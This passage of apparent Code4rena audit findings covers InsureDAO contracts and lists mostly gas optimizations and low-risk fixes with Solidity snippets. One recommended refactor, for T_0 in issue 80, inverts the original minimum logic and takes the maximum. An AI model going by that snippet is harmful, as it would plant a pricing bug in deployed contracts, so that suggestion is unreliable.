"https://github.com/code-423n4/2022-01-insure-findings/issues/133", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  p4st13r4   # Vulnerability details  ## Impact  The public `deposit` uses basically the same code of the internal `_depositFrom`. The only difference between them is that the former uses `msg.sender`, while the latter uses a parameter as `from` address. In order to minimize code duplication, `deposit` should be calling `_depositFrom` rather than being reimplemented using copy-paste  ## Proof of Concept  [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L232](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L232)  [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L255](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L255)  ## Tools Used  Editor  ## Recommended Mitigation Steps  Write `deposit` like this:  ```jsx function deposit(uint256 _amount) public returns (uint256 _mintAmount) {     _depositFrom(_amount, msg.sender); } ```  "}, {"title": "Emit an event in setKeeper()", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/132", "labels": ["bug", "0 (Non-critical)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  p4st13r4   # Vulnerability details  ## Impact  The `setKeeper()` function is operated only by the owner, and should emit an event when the keeper is set for the first time and/or changes  ## Proof of Concept  [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Vault.sol#L502](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Vault.sol#L502)  ## Tools Used  Editor  ## Recommended Mitigation Steps  Add `emit KeeperChanged(address)` after changing the keeper  "}, {"title": "No-op in CDSTemplate.sol' withdraw()", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/130", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  p4st13r4   # Vulnerability details  ## Impact  The amount of the withdrawal request is not correctly updated after a withdrawal in `CDSTemplate.sol`. This happens because the withdrawal request is read from storage and put in memory, like this:  ```jsx Withdrawal memory request = withdrawalReq[msg.sender]; ```  However, the requested amount is not updated properly since the `withdrawalReq` in the storage is never updated. Instead, its in-memory version is updated, but it\u2019s useless because that object is never used again:  ```jsx //reduce requested amount request.amount -= _amount; ```  This issue is non critical because there is a function that takes care of updating the withdrawal requests\u2019 amount on every token transfer: [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/CDSTemplate.sol#L358](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/CDSTemplate.sol#L358)  The issue lies in the fact that the code seems to behave differently from how it looks at a first glance. Furthermore, the other two templates correctly update the value of the withdrawal request, so the version in `CDSTemplate.sol` should be aligned as well:  - [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/IndexTemplate.sol#L239](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/IndexTemplate.sol#L239) - [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L327](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L327)  ## Proof of Concept  [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/CDSTemplate.sol#L230](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/CDSTemplate.sol#L230)  ## Tools Used  Editor  ## Recommended Mitigation Steps  Update the `amount` of the current withdrawal request as well  "}, {"title": "resume() can be called by anyone in IndexTemplate.sol", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/129", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  p4st13r4   # Vulnerability details  ## Impact  The `resume` function can be called by any user, at any time, even when the Index contract is not locked. There should be a check preventing it from being called unless the contract is `locked`  ## Proof of Concept  [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/IndexTemplate.sol#L459](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/IndexTemplate.sol#L459)  ## Tools Used  Editor  ## Recommended Mitigation Steps  Add a require on top:  ```jsx require(locked); ```  "}, {"title": "Wrong revert string in withdraw functions", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/128", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  p4st13r4   # Vulnerability details  ## Impact  `PoolTemplate.sol` and `IndexTemplate.sol` report this same error when trying to withdraw and some conditions are not met: \"ERROR: WITHDRAWAL_PENDING\u201d  However, `PoolTemplate.sol` does that when the `marketStatus` is not `Trading`; `IndexTemplate.sol` when the contract is locked. Since `CDSTemplate.sol`, instead, implement a different revert string, it\u2019s best for understanding what revert strings are related to by making them as explicit and clear as possible. `CDSTemplate.sol` has this in the `withdraw` function:  ```jsx require(paused == false, \"ERROR: PAUSED\"); ```  ## Proof of Concept  [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/IndexTemplate.sol#L217](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/IndexTemplate.sol#L217)  [https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L302](https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L302)  ## Tools Used  Editor  ## Recommended Mitigation Steps  Improve revert strings wording  "}, {"title": "call emit from storage is more expensive", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/124", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Fitraldys   # Vulnerability details  ## Impact in line https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L685 the function emitted a `MarketStatusChanged` event with storage variable which is `marketStatus`. when we emit an event using storage data is more expensive than emitted an event using `MarketStatus.Payingout` value.   ## Proof of Concept https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L685 ``` contract emitstatust {      enum MarketStatus {         Trading,         Payingout     }     MarketStatus public marketStatus;      event MarketStatusChanged(MarketStatus statusValue);      function amit() public {          marketStatus = MarketStatus.Payingout;      emit MarketStatusChanged(marketStatus);      } } //44792 gas ```  can change to :  ``` contract emitstatust {      enum MarketStatus {         Trading,         Payingout     }     MarketStatus public marketStatus;      event MarketStatusChanged(MarketStatus statusValue);      function amit() public {          marketStatus = MarketStatus.Payingout;      emit MarketStatusChanged(MarketStatus.Payingout);      } } //44659 gas ```  ## Tools Used remix   "}, {"title": "save Insurance data directly to storage can save gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/122", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Fitraldys   # Vulnerability details  ## Impact in line https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L508 instead of save `Insurance` value to memory then save to `insurences` storage it's better to save the `Insurence` value directly to `insurences`  storage or mapping to save gas.  ## Proof of Concept https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L508 ``` contract insur {      struct Insurance {         uint256 id; //each insuance has their own id         uint256 startTime; //timestamp of starttime         uint256 endTime; //timestamp of endtime         uint256 amount; //insured amount         bytes32 target; //target id in bytes32         address insured; //the address holds the right to get insured         bool status; //true if insurance is not expired or redeemed     }       mapping(uint256 => Insurance) public insurances;      function coba() public {          uint256 _id = 10;         uint256 _endTime = 10;         uint256 _amount = 12;         bytes32 _target = bytes32(uint256(10));           Insurance memory _insurance = Insurance(             _id,             block.timestamp,             _endTime,             _amount,             _target,             msg.sender,             true         );         insurances[_id] = _insurance;      } } //154623 gas ```  change to : ``` contract insur {      struct Insurance {         uint256 id; //each insuance has their own id         uint256 startTime; //timestamp of starttime         uint256 endTime; //timestamp of endtime         uint256 amount; //insured amount         bytes32 target; //target id in bytes32         address insured; //the address holds the right to get insured         bool status; //true if insurance is not expired or redeemed     }       mapping(uint256 => Insurance) public insurances;      function coba() public {          uint256 _id = 10;         uint256 _endTime = 10;         uint256 _amount = 12;         bytes32 _target = bytes32(uint256(10));           insurances[_id] = Insurance(             _id,             block.timestamp,             _endTime,             _amount,             _target,             msg.sender,             true         );               } } //154610 gas  ```  ## Tools Used remix  "}, {"title": "unnecessary double `totalLiquidity()` call in function availableBalance", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/121", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Tomio   # Vulnerability details  ## Impact by saving `totalLiquidity()` to memory can save more gas instead of doing double function call  ## Proof of Concept Before: https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L829 // gas cost 23862  After: ``` function totalLiquidity() public view returns (uint256){      return 10;  }     function availableBalance()public view returns (uint256 _balance)     {         uint256 saveTotalLiquidity = totalLiquidity();         if (saveTotalLiquidity > 0) {             return saveTotalLiquidity - lockedAmount;         } else {             return 0;         }     } ``` // gas cost 23840  ## Tools Used Remix  "}, {"title": "Lack of inputs in Factory", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/120", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  0x1f8b   # Vulnerability details  ## Impact Wrong deployment.  ## Proof of Concept The factory contract haven't got any check of `_registry` and `_ownership` and both values must be defined or the logic inside the contract will fault.  ## Tools Used Manual review.  ## Recommended Mitigation Steps It's mandatory to check that the address are not zero or the contract could be wrong deployed.  "}, {"title": "Gas saving caching the value", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/118", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  0x1f8b   # Vulnerability details  ## Impact Gas saving.  ## Proof of Concept There are multiple methods in `Registry` that check a value inside the storage and if it's not defined, use the default one. It's better to cache the value in order to save gas if it was defined avoiding double reading.  For example, instead of the following code: ```     function getCDS(address _address) external view override returns (address) {         if (cds[_address] == address(0)) {             return cds[address(0)];         } else {             return cds[_address];         }     } ``` use ```     function getCDS(address _address) external view override returns (address) {         address val =cds[_address];         if ( val== address(0)) {             return cds[address(0)];         } else {             return val;         }     } ```  ## Tools Used Manual review.  ## Recommended Mitigation Steps Cache the value.  "}, {"title": "split one require to two require can save gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/113", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Fitraldys   # Vulnerability details  ## Impact in line https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L260 have two check inside the require which is `marketStatus == MarketStatus.Trading` and `paused == false` and by spliting this check we can save gas.   ## Proof of Concept https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L260  ``` function woi() public {          require(             marketStatus == MarketStatus.Trading && paused == false,             \"ERROR: DEPOSIT_DISABLED\"         );      } // 23645 gas ```   can be change to   ``` function woi() public{           require(             marketStatus == MarketStatus.Trading, \"ERROR: DEPOSIT_DISABLED\"         );         require(               paused == false, \"ERROR: DEPOSIT_DISABLED\"         );      } //23637 gas ```     "}, {"title": "avoid using 'else' code can save gas in function pendingPremium", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/111", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Tomio   # Vulnerability details  ## Impact by changing the code from `if (_credit == 0) {` to `if (_credit != 0) {` and remove the else we can save gas when contract is deploy and we can save gas when `_credit` is equal to 0. because if `_credit` equal to 0 the original function will return 0 which a default value for uint256  ## Proof of Concept Before: https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L776 // gas 24307  After: ``` function pendingPremium(address _index)         external         view         returns (uint256)     {         uint256 _credit = indicies[_index].credit;        if (_credit != 0) {             return                 _sub(                     (_credit * rewardPerCredit) / MAGIC_SCALE_1E6,                     indicies[_index].rewardDebt                 );         }     } ``` // gas 24286   ## Tools Used Remix  ## Recommended Mitigation Steps  "}, {"title": "Missing validation of address argument could indefinitely lock Registry contract", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/110", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  defsec   # Vulnerability details  ## Impact  the owner parameter are used for the onlyOwner modifier. In the state variable , proper check up should be done , other wise error in these state variable can lead to redeployment of contract. If the zero address is assigned to rebalanceManager parameter, that will fail all Owner functions.  ## Proof of Concept  1. Navigate to the following contract functions.  \"https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Registry.sol#L31\"  2. Adding zero address into the owner leads to failure of onlyOwner only functions.  ## Tools Used  Code Review  ## Recommended Mitigation Steps  Add proper zero address validation.  "}, {"title": "in function _sub, less gas used using unchecked", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/108", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Tomio   # Vulnerability details  ## Impact by using 'unchecked' you can save  +-182 gas  ## Proof of Concept before: https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L938 //22378 before  after: ``` function _sub(uint256 a, uint256 b) public pure returns (uint256) {         if (a < b) {             return 0;         } else {             unchecked {return a - b;}         }     }   ``` //22196 after   ## Tools Used Remix  ## Recommended Mitigation Steps used 'unchecked' in function _sub  "}, {"title": "Uncontrolled call to controller, which can be the zero address", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/94", "labels": ["bug", "1 (Low Risk)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  camden   # Vulnerability details  ## Impact The `utilize()` function can be called while the controller is the zero address. This will fail. A comment in the constructor says that the controller shouldn't be the zero address.  ## Proof of Concept https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L350  ## Recommended Mitigation Steps `utilize` should have a check to see if the controller is not the zero address (like `_unutilize`) and give an appropriate error message.  "}, {"title": "Gas optimization in Vault.addValueBatch()", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/89", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  tqts   # Vulnerability details  ## Impact None  ## Proof of Concept The `for` loop at [L109-113](https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L109-L113) can be unrolled to remove the overhead of the loop itself, and avoid using an initialized-to-zero uint128 variable.  ## Tools Used Manual review  ## Recommended Mitigation Steps Replace L109-113 with: ``` uint256 _allocation = (_shares[0] * _attributions) / MAGIC_SCALE_1E6; attributions[_beneficiaries[0]] += _allocation; _allocations[0] = _allocation;  _allocation = (_shares[1] * _attributions) / MAGIC_SCALE_1E6; attributions[_beneficiaries[1]] += _allocation; _allocations[1] = _allocation; ```  "}, {"title": "Shorten Error Messages to Save Gas", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/87", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  0xngndev   # Vulnerability details  ## Impact  Error Messages that have a length of 32 or more one require one additional slot to be stored, causing extra gas costs when deploying the contract and when the function is executed and it reverts.  ## Proof of Concept  I put together a quick proof to show the different impact of the errors we can have in Solidity:  - Long require errors => more than 32 bytes - Short require errors => less than 32 bytes - Custom errors  Here are the contract size findings:  ```rust //SPDX-License-Identifier: unlicensed pragma solidity 0.8.10;  contract Errors {   bool public thisIsFalse;   error WithdrawalExceeded();    /*     Contract Size with just this function: 333 bytes;   */   function moreThan32Bytes() public {     require(thisIsFalse, \"ERROR: WITHDRAWAL_EXCEEDED_REQUEST\");   }    /*     Contract Size with just this function: 295 bytes; //   */   function lessThan32Bytes() public {     require(thisIsFalse, \"WITHDRAWAL_EXCEEDED_REQUEST\");   }    /*     Contract Size with just this function: 242 bytes;   */   function customError() public {     if (!thisIsFalse) revert WithdrawalExceeded();   } } ```  I then run tests to see the gas costs of having the functions revert, and although these are not very accurate due to the fact that it\u2019s hard to isolate the gas costs of a reverting function due to the order of execution (I can\u2019t have an event that logs the gas before the function revert and another one after because the one after the revert will never be reached), it still shows some differences.  ```rust //SPDX-License-Identifier: unlicensed pragma solidity 0.8.10;  import \"ds-test/test.sol\"; import \"../Errors.sol\";  contract ErrorsTest is DSTest {   Errors errors;    function setUp() public {     errors = new Errors();   }    function testFailLessThan32Bytes() public logs_gas {     errors.lessThan32Bytes();   }    function testFailMoreThan32Bytes() public logs_gas {     errors.moreThan32Bytes();   }    function testFailCustomError() public logs_gas {     errors.customError();   } } ```  ```rust Running 3 tests for \"ErrorsTest.json\":ErrorsTest [PASS] testFailCustomError() (gas: 3161) [PASS] testFailLessThan32Bytes() (gas: 3314) [PASS] testFailMoreThan32Bytes() (gas: 3401) ```  ## Tools Used  DappTools/Foundry  ## Recommended Mitigation Steps  Personally, I would switch to custom errors and reverts to maximize the savings, but if you dislike revert syntax, then I would suggest to check which of your require errors have a length longer than 32, and shorten them so that their length is less than 32.  Here are some examples of the errors you could shorten in your `CDSTemplate.sol` contract:  - `ERROR: INITIALIZATION_BAD_CONDITIONS` - `ERROR: WITHDRAWAL_NO_ACTIVE_REQUEST` - `ERROR: WITHDRAWAL_EXCEEDED_REQUEST`  Removing the \u201cERROR\u201d keyword should be enough for most of these. Bear in mind you can always have concise error messages and a section in your documentation that explains them further or have your natspec expand on them if you find them too cryptic.   An example of how to apply a custom error in the first error would be to just have the error `say BadConditions()`. The user knows it\u2019s an error because the function call failed, and the user knows it has happened in the initialize function because he called it, so `BadConditions()` should be a clear message despite being concise  "}, {"title": "Loss of precision and increased gas cost with double assignment on a calculation  ", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/84", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  In `IndexTemplate.sol:withdrawable()`, the following can be optimized to save gas and avoid a loss of precision, from: ```                 uint256 _necessaryAmount = _targetLockedCreditScore * totalAllocPoint /  _targetAllocPoint;                 _necessaryAmount = _necessaryAmount *  MAGIC_SCALE_1E6 / targetLev; ``` to ```                 uint256 _necessaryAmount = _targetLockedCreditScore * totalAllocPoint *  MAGIC_SCALE_1E6 /  (_targetAllocPoint * targetLev); ```  "}, {"title": "Gas: Use `else if` to save gas and simplify code", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/83", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Increased gas cost  ## Proof of Concept In `IndexTemplate.sol:_adjustAlloc()`, the 3 following conditions are always evaluated: ```                 //Withdraw or Deposit credit                 if (_current > _target && _available != 0) {                     //if allocated credit is higher than the target, try to decrease                     uint256 _decrease = _current - _target;                     IPoolTemplate(_poolList[i].addr).withdrawCredit(_decrease);                     totalAllocatedCredit -= _decrease;                 }                 if (_current < _target) {                     uint256 _allocate = _target - _current;                     IPoolTemplate(_poolList[i].addr).allocateCredit(_allocate);                     totalAllocatedCredit += _allocate;                 }                 if (_current == _target) {                     IPoolTemplate(_poolList[i].addr).allocateCredit(0);                 } ``` The code can be optimized to save some gas: ```                 if (_current == _target) {                     IPoolTemplate(_poolList[i].addr).allocateCredit(0);                 } else if (_current < _target) {                     uint256 _allocate = _target - _current;                     IPoolTemplate(_poolList[i].addr).allocateCredit(_allocate);                     totalAllocatedCredit += _allocate;                 } else if (_current > _target && _available != 0) {                     //Withdraw or Deposit credit                     //if allocated credit is higher than the target, try to decrease                     uint256 _decrease = _current - _target;                     IPoolTemplate(_poolList[i].addr).withdrawCredit(_decrease);                     totalAllocatedCredit -= _decrease;                 } ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Apply the refacto  "}, {"title": "Gas: Short-circuiting in an if-statement", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/82", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact > The operators \u201c||\u201d and \u201c&&\u201d apply the common short-circuiting rules. This means that in the expression \u201cf(x) || g(y)\u201d, if \u201cf(x)\u201d evaluates to true, \u201cg(y)\u201d will not be evaluated even if it may have side-effects.  Source: https://docs.soliditylang.org/en/v0.5.4/types.html#booleans  ## Proof of Concept In `IndexTemplate.sol:withdrawable()`, there's an if-statement as such: ``` 293:                         if (i == 0 || _availableRate < _lowestAvailableRate) { ``` Here, the condition `i == 0` is always evaluated and is always equal to `false` when `i > 0`, meaning here a total of `poolList.length - 1` evaluations are always evaluated to `false`.  It's best to reorder the conditions such as this condition doesn't get evaluated if `_availableRate < _lowestAvailableRate` is satisfied: ``` 293:                         if (_availableRate < _lowestAvailableRate || i == 0 ) { ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Apply the refacto  "}, {"title": "Gas: Redundant if-statement with the for-loop condition", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/81", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Increased gas cost  ## Proof of Concept In `Factory.sol`, the following `> 0` checks are redundant with the for-loop condition, because if `_references.length == 0` or `_conditions.length == 0`, the condition `uint256 i = 0; i <(_conditions)|(_references).length` will never be satisfied and the for-loop won't iterate: ``` 175:         if (_references.length > 0) { 176:             for (uint256 i = 0; i < _references.length; i++) { 177:                 require( 178:                     reflist[address(_template)][i][_references[i]] == true || 179:                         reflist[address(_template)][i][address(0)] == true, 180:                     \"ERROR: UNAUTHORIZED_REFERENCE\" 181:                 ); 182:             } 183:         } 184:  185:         if (_conditions.length > 0) { 186:             for (uint256 i = 0; i < _conditions.length; i++) { 187:                 if (conditionlist[address(_template)][i] > 0) { 188:                     _conditions[i] = conditionlist[address(_template)][i]; 189:                 } 190:             } 191:         }  ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Remove these 2 if-statements  "}, {"title": "Gas: Avoid double assignment on variable", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/80", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Increased gas cost  ## Proof of Concept The variable `T_0` can go through 2 assignments in a row: Here: ``` 75:         uint256 T_0 = _totalLiquidity; 76:         if (T_0 > T_1) { 77:             T_0 = T_1; 78:         } ``` And here: ``` 134:         uint256 T_0 = _totalLiquidity; 135:         if (T_0 > T_1) { 136:             T_0 = T_1; 137:         } ```  The code can be optimized as such to save some gas: ```         uint256 T_0 = _totalLiquidity > T_1 ? _totalLiquidity : T_1; ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Apply the refacto   "}, {"title": "`CDSTemplate.sol:compensate` code optimization", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/79", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Duplicated code, loss of maintainability, increased contract size which leads to increased gas cost  ## Proof of Concept The following can be simplified: ``` 260:         if (_available >= _amount) { 261:             _compensated = _amount; 262:             _attributionLoss = vault.transferValue(_amount, msg.sender); 263:             emit Compensated(msg.sender, _amount); 264:         } else { 265:             //when CDS cannot afford, pay as much as possible 266:             _compensated = _available; 267:             _attributionLoss = vault.transferValue(_available, msg.sender); 268:             emit Compensated(msg.sender, _available); 269:         } ``` to ``` 260:         _compensated = _available >= _amount ? _amount : _available; //when CDS cannot afford, pay as much as possible 261:         _attributionLoss = vault.transferValue(_compensated, msg.sender); 262:         emit Compensated(msg.sender, _compensated); ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Apply the refacto and look out for duplicated code  "}, {"title": "Gas: Contracts inheriting `InsureDAOERC20` don't need to import some dependencies *again*", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/78", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact When a contract imports and implements an interface or another contracts, it doesn't need to import the libraries that were already imported there.  Removing these imports will save gas.  ## Proof of Concept `InsureDAOERC20` imports the following:  ``` 5: import \"@openzeppelin/contracts/token/ERC20/IERC20.sol\"; 6: import \"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol\"; ```  The following contracts inherit `InsureDAOERC20` and also make those imports: `CDSTemplate`, `IndexTemplate`, `PoolTemplate`  ## Tools Used VS Code  ## Recommended Mitigation Steps Remove the unused imports to reduce the size of the contract and save some deployment gas.  "}, {"title": "unnecessary checked postfix arithmetics", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/76", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  egjlmn1   # Vulnerability details  in all of your for loops, you increase your loop variable using `i++` it has 2 problems: 1. postfix increment is more wasteful than prefix increment (`++i` instead of `i++`) 2. there is no risk for overflow, so you can use `unchecked{}`  ## Impact prefix arithmetic is a bit cheaper than postfix arithmetic, but if you do it in a for loop, this small amount of gas can pile up and be a big waste. also, in solidity 0.8.0+, every arithmetic operation is checked for overflow and underflow, which adds a lot of gas to a single operation. Since in your for loop you don't have the risk for overflow, you can surround the operation in `unchecked{}` to save a lot of gas (which will save a huge amount since it saves a lot in a single loop iteration.)  ## Proof of Concept Checked on remix  ## Tools Used manual code review  ## Recommended Mitigation Steps change every `i++` in your for loops to `unchecked{++i}`  "}, {"title": "Gas: Consider making variables that aren't updated outside the constructor as `immutable`", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/72", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact The compiler won't reserve a storage slot for `immutable` variables  ## Proof of Concept The following variables are initialized in the contract's constructor and can't get updated after: ``` Factory.sol:registry Factory.sol:ownership Parameters:ownership BondingPremium:ownership Registry:ownership Vault:ownership ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Make these variables `immutable`  "}, {"title": "Gas: Costly operations inside a loop (`IndexTemplate._adjustAlloc()`)", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/69", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Repetitive and expensive SSTORE opcode operations inside loops  ## Proof of Concept ```  totalAllocatedCredit -= _available (contracts/IndexTemplate.sol#368)  totalAllocatedCredit -= _decrease (contracts/IndexTemplate.sol#395)  totalAllocatedCredit += _allocate (contracts/IndexTemplate.sol#401) ```  ## Tools Used Slither  ## Recommended Mitigation Steps Create a memory variable which will be used to compute a `_totalAllocatedCredit` that will get added to `totalAllocatedCredit` storage variable outside the loop. As an idea, you could create 1 such `int` variable and use it's value after the for-loop, or you could create 2 uint variables where 1 would store the _totalDecrease and 1 would store the _totalAllocate, and respectively substract and add them.   "}, {"title": "Gas: Storage variable `IndexTemplate:pendingEnd#62` is never used and should be deleted", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/68", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact Increased gas cost (1 slot)  ## Proof of Concept IndexTemplate.pendingEnd (contracts/IndexTemplate.sol#62) should be deleted as it's never used by the contract  ## Tools Used Slither  ## Recommended Mitigation Steps Delete the variable `IndexTemplate.pendingEnd`  "}, {"title": "Gas: Unnecessary checked arithmetic when no overflow/underflow possible", "html_url": "https://github.com/code-423n4/2022-01-insure-findings/issues/66", "labels": ["bug", "G (Gas Optimization)", "resolved", "sponsor confirmed"], "target": "2022-01-insure-findings", "body": "# Handle  Dravee   # Vulnerability details  ## Impact  Increased gas cost.   ## Proof of Concept  Solidity version 0.8+ comes with implicit overflow and underflow checks on unsigned integers.  When an overflow or an underflow isn't possible (as an example, when a comparison is made before the arithmetic operation, or the operation doesn't depend on user input), some gas can be saved by using an `unchecked` block.  https://docs.soliditylang.org/en/v0.8.10/control-structures.html#checked-or-unchecked-arithmetic  These lines are the obvious ones that can't underflow or overflow (operations on constants or checks already made before the operations with `require` statements or `if` statements): ```  PremiumModels\\BondingPremium.sol:47:        T_1 = 1000000 * DECIMAL; PremiumModels\\BondingPremium.sol:130:        uint256 u1 = BASE - ((_lockedAmount * BASE) / _totalLiquidity); //util rate before. 1000000 = 100.000% PremiumModels\\BondingPremium.sol:132:            (((_lockedAmount + _amount) * BASE) / _totalLiquidity); //util rate after. 1000000 = 100.000% IndexTemplate.sol:292:                        uint256 _lockedCredit = _allocated - _availableBalance; PoolTemplate.sol:942:            return a - b; IndexTemplate.sol:308:                    _retVal = _totalLiquidity - _necessaryAmount; IndexTemplate.sol:393:                    uint256 _decrease = _current - _target; IndexTemplate.sol:399:                    uint256 _allocate = _target - _current; IndexTemplate.sol:441:                _shortage = _amount - _value; InsureDAOERC20.sol:255:        _balances[sender] = senderBalance - amount; InsureDAOERC20.sol:303:        _balances[account] = accountBalance - amount; Vault.sol:165:            uint256 _shortage = _amount - available(); Vault.sol:310:            uint256 _shortage = _retVal - available(); ```   ## Tools Used  VS Code   ## Recommended Mitigation Steps Uncheck arithmetic operations when the risk of underflow or overflow is already contained.  "}, {"title": "Gas: Use `calldata` instead of `memory` for 